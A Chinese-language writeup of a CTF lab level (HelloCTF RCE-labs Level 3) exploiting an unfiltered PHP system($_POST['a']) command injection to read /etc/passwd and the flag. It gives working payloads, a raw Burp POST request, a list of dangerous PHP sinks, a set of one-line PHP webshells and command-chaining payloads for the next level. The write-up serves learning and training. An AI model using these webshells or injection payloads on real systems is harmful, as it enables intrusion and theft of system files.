---
title: RCE-labs Level3 wp
published: 2026-10-07
pinned: false
description: Level 3：命令执行
tags: [ctf,web]
category: node
draft: false
---

# HelloCTF RCE 靶场 Level 3：命令执行 —— Writeup

## 一、题目信息

| 项目 | 内容 |
|---|---|
| 靶场 | HelloCTF RCE 靶场（RCE-labs） |
| 关卡 | Level 3 —— 命令执行 |
| 靶机地址 | `http://80-e173eef5-489c-40c6-b503-4dcd57d855a.challenge.ctfplus.cn/` |
| 漏洞类型 | 命令执行（Command Injection / RCE） |
| 入口参数 | POST 参数 `a` |
| 过滤情况 | 无任何过滤 |
| 目标 | 读取容器内的 flag 文件 |

```
Warning: system(): Cannot execute a blank command in /var/www/html/index.php on line 21
<?php 
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCE靶场 : 命令执行 --- 

「命令执行(Command Execution)」 通常指的是在操作系统层面上执行预定义的指令或脚本。这些命令最终的指向通常是系统命令，如Windows中的CMD命令或Linux中的Shell命令，这在语言中可以体现为一些特定的函数或者方法调用，如PHP中的`shell_exec()`函数或Python中的`os.system()`函数。

当漏洞入口点只能执行系统命令时，我们可以称该漏洞为命令执行漏洞，如下面修改过的 "一句话木马":

try POST:
    a=cat /etc/passwd;

*/

system($_POST['a']);

highlight_file(__FILE__);


?>
```


> 注：上方地址是平台下发的临时实例，题目做完后会失效。复现时请替换成自己那一份。

---

## 二、题目分析

### 2.1 页面直接给出了源码

打开靶机，页面正文其实就是自己的 PHP 源码（因为最后一行是 `highlight_file(__FILE__)`，把自身打印了出来）。去掉大段教学注释后，真正有意义的就三行：

```php
<?php
// ……中间是一大段教学注释……
system($_POST['a']);
highlight_file(__FILE__);
?>
```

### 2.2 从页面读出的三条线索

| 线索（页面原文） | 出现位置 | 推出的结论 |
|---|---|---|
| `HelloCTF - RCE 靶场 ： 命令执行` | 注释里的标题 | 漏洞类型是**命令执行**，不是文件包含、不是反序列化 |
| `system($_POST['a']);` | 源码三行之一 | 参数名叫 `a`，且值会被**原样交给系统 shell 执行**，结果直接回显 |
| `try POST: a=cat /etc/passwd;` | 注释块最后 | 出题人**亲自示范**了一个 payload：用 `cat` 读文件 |

### 2.3 判断结论

1. **有回显**：`system()` 是"执行命令并把输出打到页面上"的函数，所以能直接看到结果，不需要写文件再访问、也不需要外带（DNS/HTTP log）。
2. **无过滤**：源码里没有 `str_replace`、没有 `preg_match`、没有黑名单数组。所以 `;`、`&&`、`|`、反引号全部可用——这一关的定位就是"无过滤的入门关"。
3. **参数用 POST 传**：`$_POST['a']`，所以请求方法必须是 POST，且 body 要符合表单编码。

### 2.4 利用思路

`cat` 是"打印文件内容"的命令，出题人已经用 `/etc/passwd` 演示过了。那么：

```
把 cat 的目标，从 /etc/passwd 换成 flag 文件
```

Linux 题里 flag 的惯例落点是根目录。所以最终 payload 就是：

```
a=cat /flag
```

如果不知道文件名，也可以先让靶机自己报（纯黑盒三连）：

| 顺序 | payload | 目的 |
|---|---|---|
| 1 | `a=ls /` | 列出根目录，看 flag 文件到底叫什么 |
| 2 | `a=cat /flag` | 按上一步看到的真名去读 |
| 3 | `a=id` | 确认当前身份（一般是 `www-data`） |
| 4 | `a=env` | 兜底：flag 会不会藏在环境变量里 |

---

## 三、解题过程

### 3.1 环境准备

- 浏览器：Chrome / Edge
- 工具任选其一即可：
  - **HackBar**（浏览器 DevTools 内置版）
  - **Burp Suite Community Edition v2026.8**（新版 UI）
- 本关是 `http://` 明文请求，**不需要配置任何代理，也不需要安装 CA 证书**。

### 3.2 工具 A：HackBar

| 步骤 | 操作 |
|---|---|
| 1 | 打开靶机页面，按 `F12` 打开 DevTools，点 **HackBar** 页签 |
| 2 | 点 **LOAD**，把当前 URL 填进 `URL` 框（已填好可跳过） |
| 3 | **拨开 `Use POST method` 开关** ← 最容易漏的一步，不开就是 GET |
| 4 | `enctype` 下拉保持 `application/x-www-form-urlencoded` |
| 5 | 在 `Body` 文本框里填 payload |
| 6 | 点 **EXECUTE**（大写那个按钮） |

**第一步：验证漏洞（出题人给的样例）**

```
a=cat /etc/passwd
```

页面**最顶部**（源码之前）出现账号列表 ⇒ 命令执行成功。

**第二步：直接读 flag**

```
a=cat /flag
```

回显区顶部出现 flag 字符串，拿到即完成。

> 若想先确认文件名，第二步换成 `a=ls /`，看清楚名字后再 `a=cat /flag`。

**HackBar 用的按钮**：`LOAD`、`EXECUTE`、`Use POST method` 开关、`enctype` 下拉。
其余 `SPLIT / TEST / SQLi / XSS / LFI / SSRF` 本题统统用不上，别去点。

### 3.3 工具 B：Burp Suite（v2026.8 新版 UI）

**步骤 0：启动**

弹出窗口选 **Temporary project** → **Use Burp defaults** → **Start Burp**。

**步骤 1：开内置浏览器**

`Proxy → Intercept` 页 → 右上角点 **Open browser**。会弹出一个 Chromium 窗口，代理已经自动配好。

> 顺手确认 `Proxy → Intercept` 顶部的 **`Intercept is on / off`** 开关是 **off**。
> 它要是 on，浏览器发出的请求会卡在队列里"一直转圈"，HTTP history 里半天看不到记录。
> 本题只需反复改 payload，用 Repeater 就够，**不需要开 Intercept**。

**步骤 2：抓一条请求**

1. 在内置浏览器里访问靶机地址，**等页面完整加载完**
2. 回到 Burp → `Proxy → HTTP history` → 找到 **`GET /`** 那条（Host 是靶机域名）
3. 选中它按 **`Ctrl+R`**（等价于右键 → **Send to Repeater**）

**步骤 3：在 Repeater 里把请求改成 POST**

切到顶部的 **Repeater** 标签，在**左栏 Request** 文本框里手动改三处：

| # | 改动 |
|---|---|
| ① | 第一行 `GET / HTTP/1.1` → `POST / HTTP/1.1` |
| ② | 在 `Host:` 下面**新增一行** `Content-Type: application/x-www-form-urlencoded` |
| ③ | 所有请求头写完之后，**留一整行真正的空行**，再写 `a=cat /flag` |

改完的报文：

```http
POST / HTTP/1.1
Host: 80-e173eef5-489c-40c6-b503-4dcd57d855a.challenge.ctfplus.cn
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0

a=cat /flag
```

要点：

- `Content-Length` **不用自己算**，点 Send 时 Burp 会自动重算。
- 原有的 `Accept`、`Upgrade-Insecure-Requests`、`User-Agent` 等头**保留不动**，不影响结果。
- 头与 body 之间的那个空行**必须是真空行**。若点 Send 后响应毫无变化，先切 **Raw** 视图确认空行还在。
- 编辑器末尾不要留多余字符。

**步骤 4：发送并读结果**

点左栏上方的 **Send** → 右栏 Response 立刻刷新，**flag 就在响应最顶部**（在 `highlight_file` 打印出来的源码之前）。

**步骤 5：继续换 payload**

只改 body 那一行，再点 Send。**一次只发一条**，别用 `&` 拼接多条命令，否则输出会混成一坨难读。

### 3.4 两套工具对照表

| 环节 | HackBar | Burp Suite |
|---|---|---|
| 发 POST | 拨开 `Use POST method` 开关 | 手动把第一行 `GET` 改成 `POST` |
| Content-Type | `enctype` 下拉框自动带上 | **必须自己加一行** |
| 发送按钮 | `EXECUTE` | `Send` |
| 换 payload | 改 `Body` 框 | 改 Raw 里的 body |
| 请求留档 | 无 | HTTP history 全程记录，可随时回看 |
| 适用性 | 单发、快速试 | 批量、需要精细控制报文时更好用 |

### 3.5 结果

```
a=cat /flag
```

响应顶部返回：

```
<flag 内容>
```

提交该 flag，本题完成。

---

## 四、读不到 flag 时的排查表

| 回显现象 | 原因 | 处理 |
|---|---|---|
| 页面完全没变化 | 请求发成了 GET，`$_POST` 为空 | 确认 POST 已生效（HackBar 拨开关 / Burp 改方法） |
| `cat: /flag: No such file or directory` | 文件名或路径不对 | 先发 `a=ls -la /`，按真实文件名再读 |
| `Permission denied` | 权限不足 | `a=id` 看身份；`a=find / -name "*flag*" 2>/dev/null` 找可读的那份 |
| 想确认 flag 是否在环境变量里 | — | `a=env` |
| Burp 响应 `400 Bad Request` | 手写过 Content-Length，与 body 不符 | 删掉该行，让 Burp 自己加 |
| Burp 里 Response 无变化 | 空行丢了，body 被当成了请求头 | 切 Raw 视图确认空行 |
| Burp 请求没进 history | 用了外部浏览器没配代理，或 Intercept 卡着 | 改用 **Open browser**；关掉 Intercept |
| 响应全是 HTML 但没有命令输出 | 回显在页面顶部，往下翻了 | 直接看响应第一屏 |

---

## 五、原理解释

### 5.1 `system()` 为什么能执行系统命令

`system()` 是 PHP 的一个**命令执行类函数**：它把参数字符串交给操作系统的 shell（Linux 下是 `/bin/sh`）去执行，并把命令的标准输出**直接写到 PHP 的输出流**里，也就是最终出现在页面上。

所以下面这一行：

```php
system($_POST['a']);
```

当 `a` 的值是 `cat /etc/passwd` 时，实际等价于服务器执行了：

```sh
cat /etc/passwd
```

**用户可控的数据（`$_POST['a']`）流进了一个危险函数（`system`）——这就是漏洞的通用公式。**至于危险函数是哪一个，只影响 payload 的写法，不影响利用思路。

### 5.2 命令执行 vs 代码执行：分水岭在哪

| 对比项 | 代码执行（eval 类） | 命令执行（system 类） |
|---|---|---|
| 执行者 | **PHP 解释器** | **操作系统的 shell** |
| 语法 | PHP 语法 | shell 语法 |
| 结尾要不要分号 | **要**（PHP 语句结束符） | 不要（分号是 shell 的命令分隔符，可有可无） |
| 典型 payload | `a=echo $flag;` | `a=cat /flag` |
| 换个说法 | 让 PHP 帮你读文件 | 让系统帮你读文件 |

这一关最直观的自证方式就在第一关的经验里：**你发 `a=cat /etc/passwd`（不带分号）也能成功**，说明这段字符串没被当 PHP 代码解析，而是被交给了 shell —— 这正是"命令执行"而非"代码执行"的证据。

### 5.3 Content-Type 为什么必须带

HTTP body 只是一串**裸字节**，服务器要知道"按什么格式解析"完全依赖 `Content-Type` 头。

PHP 的 `$_POST` 超全局数组**只在** `Content-Type` 为下面两种之一时才会被填充：

- `application/x-www-form-urlencoded`
- `multipart/form-data`

如果这个头缺失、或写成 `application/json`，`$_POST` 会是**空数组**，body 只能用 `file_get_contents("php://input")` 以原始字符串读到 —— 本题的 `system($_POST['a'])` 就会**空转**，页面毫无反应。

**HackBar 里感觉不到这个问题**，是因为它的 `enctype` 下拉框自动帮你加了这个头；**Burp 里没有这个下拉框，必须手写。**

### 5.4 为什么回显出现在页面最顶部

源码的执行顺序是：

```php
system($_POST['a']);        // 先执行 —— 命令输出立刻吐出
highlight_file(__FILE__);   // 后执行 —— 才打印源码
```

所以命令的输出排在源码**之前**。排查时别只盯着下面那坨源码，往上翻第一屏才是结果。

### 5.5 注释里那个分号（`a=cat /etc/passwd;`）

这个 `;` **不是 PHP 要求的**（`system()` 作为函数调用本身以 `;` 结束的是整条 PHP 语句，而不是参数内容的一部分）。payload 里的 `;` 是给 **shell** 的**命令分隔符**，作用是"上一条命令结束后再执行下一条"，写在末尾时后面是空命令，等价于没有。

写不写都行 —— 你第一次没写也成功了。

### 5.6 这一关为什么不需要任何绕过

页面上没有出现任何过滤痕迹（没有 `str_replace`、没有 `preg_match`、没有黑名单数组），源码核心就三行。所以 `;`、`&&`、`||`、`|`、反引号、`$()` 全部可用。

这不是出题人偷懒，而是关卡设计：**Level 3 的定位就是"无过滤的入口关"**，用来让做题人先确认"我确实能执行任意命令"。从 Level 4 开始才会逐步加限制。

### 5.7 同类危险函数全景（后续关卡会换 sink）

**通用公式：用户可控的数据 → 流进了危险函数 = 漏洞。**

**命令执行类**

| 函数 | 特点 |
|---|---|
| `system()` | 有回显，输出直接打到页面 |
| `passthru()` | 有回显，且支持二进制数据输出 |
| `shell_exec()` | **无回显**，返回字符串，要 `echo` 才看得到 |
| 反引号 `` `cmd` `` | 等价于 `shell_exec()` 的语法糖；`shell_exec` 被禁用时它也失效 |
| `exec()` | **无回显**，结果存进数组，需 `print_r` 打印 |
| `popen()` / `proc_open()` | 返回资源句柄，需配合 `fread()` 读取 |
| `pcntl_exec()` | 直接替换进程映像 |
| `mail()` 第 5 参数 | 冷门但真实 |
| `putenv()` + `LD_PRELOAD` | 环境变量注入路线 |

**代码执行类**

| 函数 | 版本注意 |
|---|---|
| `eval()` | 一直可用 |
| `assert()` | PHP 7.2+ 起不再把字符串当代码执行 |
| `create_function()` | 7.2 弃用，8.0 移除 |
| `preg_replace()` 带 `/e` | PHP 7.0 起移除 |
| `call_user_func()` / `call_user_func_array()` | 函数名可控即可 |
| 变量函数 `$_POST['f']($_POST['x'])` | 经典变形 |
| `array_map()` / `usort()` 等回调参数 | 回调名可控 |

**一句话木马家族（写马 / 自检用）**

```php
<?php @eval($_POST['a']); ?>        // 最经典
<?php system($_GET['c']); ?>        // 命令马
<?= `$_GET['c']`; ?>                // 反引号马（最短）
<?php $_GET['f']($_GET['a']); ?>    // 动态函数马
```

### 5.8 找 sink 的通用排查链

1. **找入口** —— 用户输入从哪进来（GET / POST / Cookie / Header / 文件）
2. **找危险函数** —— 在源码里搜上面那些名字
3. **判版本** —— `/e`、`assert` 字符串执行这类老特性还灵不灵（`phpinfo()` 最直接）
4. **看过滤** —— 黑名单拦了什么、漏了什么（大小写、编码、关键字拆分）
5. **查 `disable_functions`** —— 目标函数是否被禁用（`phpinfo()` 里能看到）

---

## 六、下一关预告：Level 4 — SHELL 运算符

从下一关起，入口会变成类似 `?ip=127.0.0.1` 的 ping 形式，考的是**命令拼接符**：

```text
?ip=;cat /flag           分号：前后无所谓，都执行
?ip=&&cat /flag          逻辑与：前一条成功才执行后一条
?ip=|cat /flag           管道：把前一条的输出交给后一条
?ip=%26cat /flag         & 后台运行符，URL 里要编码成 %26
```

**打法**：先发一次正常的 `?ip=127.0.0.1` 看回显长什么样，再判断该用 `;` 还是 `&&`。

---

## 七、要点清单（可当速查卡）

1. `system($_POST['a'])` ⇒ 参数值原样进 shell，输出直接回显在页面**顶部**。
2. 命令执行**不需要** payload 结尾带分号；PHP 代码执行**必须**带。
3. 用 POST 传参时，`Content-Type: application/x-www-form-urlencoded` **必须存在**，否则 `$_POST` 是空的。
4. Burp 里从 history 抓到的都是 `GET`，**方法要手动改**，别指望工具自动换。
5. 头与 body 之间的空行**必须是真的空行**，丢了 body 就变成请求头。
6. flag 找不到时，先 `ls /` 让靶机自己报文件名，别猜。
7. 一次只发一条 payload，避免输出混杂。
8. **命令执行类**：读文件用 `cat`，找文件用 `find`，看身份用 `id`，看环境用 `env`。

---

*Writeup 完*
